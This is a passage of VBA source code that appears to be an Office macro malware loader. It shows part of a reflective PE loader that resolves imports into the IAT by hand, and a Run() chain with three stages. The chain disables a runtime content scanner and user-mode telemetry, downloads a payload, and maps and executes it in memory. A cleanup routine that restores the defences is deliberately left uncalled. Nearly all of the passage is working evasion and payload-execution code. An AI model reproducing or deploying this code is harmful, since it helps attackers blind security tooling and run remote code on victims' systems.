            Dim hiByte As Byte
            CopyMemory VarPtr(hiByte), intPtr + CLngPtr(PTR_SIZE - 1), 1

            If (hiByte And &H80) <> 0 Then
                funcAddr = GetProcAddressPtr(hMod, thunkVal And CLngPtr(&HFFFF&))
            Else
                Dim hintNameRVA As Long: hintNameRVA = RdLong(intPtr)
                funcAddr = GetProcAddressPtr(hMod, base + CLngPtr(hintNameRVA) + 2)
            End If

            WrPtr iatPtr, funcAddr

            intPtr = intPtr + CLngPtr(PTR_SIZE)
            iatPtr = iatPtr + CLngPtr(PTR_SIZE)
        Loop

NextDesc:
        desc = desc + IMPORT_DESC_SIZE
    Loop
End Sub

' =========================================================
' CHAIN ENTRY
' =========================================================

Public Function Run() As Boolean
    mReport = ""

    ' stage 1: neutralize the runtime content scanner
    ArmScan
    Debug.Print "[*] scan: " & m1State & " (" & m1SlotCount & " slot(s))"

    ' stage 2: silence user-mode telemetry
    ArmTelemetry
    Debug.Print "[*] telemetry: " & m2State & " (" & m2Count & " registration(s))"

    ' stage 3: fetch and map the payload
    Dim pe() As Byte
    pe = DownloadPayload()

    Dim sz As Long
    On Error Resume Next
    sz = UBound(pe) + 1
    On Error GoTo 0

    If sz = 0 Then
        mReport = "scan=" & m1State & ";etw=" & m2State & ";dll=fetch-failed"
        Debug.Print "[!] payload fetch failed"
        DevLogWrite mReport
        Exit Function
    End If

    mDllBase = MapAndExecute(pe)
    If mDllBase = 0 Then
        mReport = "scan=" & m1State & ";etw=" & m2State & ";dll=map-failed"
        Debug.Print "[!] mapping failed"
        DevLogWrite mReport
        Exit Function
    End If

    mReport = "scan=" & m1State & ";etw=" & m2State & ";dll=" & Hex(mDllBase)
    Debug.Print "[+] chain complete: " & mReport
    DevLogWrite mReport
    Run = True
End Function

Public Function GetReport() As String
    GetReport = mReport
End Function

Public Function DisarmAll() As Boolean
    ' restores both neutralizers; the mapped payload stays where it is.
    ' not called by Run: the chain keeps its protection for the payload's
    ' lifetime, and process teardown reclaims everything anyway.
    DisarmTelemetry
    DisarmScan
    DisarmAll = True
End Function

' ===================== DEV LOG =====================

#If DEV_LOG Then
Private Sub DevLogWrite(ByVal s As String)
    Dim f As Integer
    f = FreeFile
    Open DEV_LOG_PATH For Append As #f
    Print #f, s
    Close #f
End Sub
#Else
Private Sub DevLogWrite(ByVal s As String)
    ' no-op in release builds
End Sub
#End If
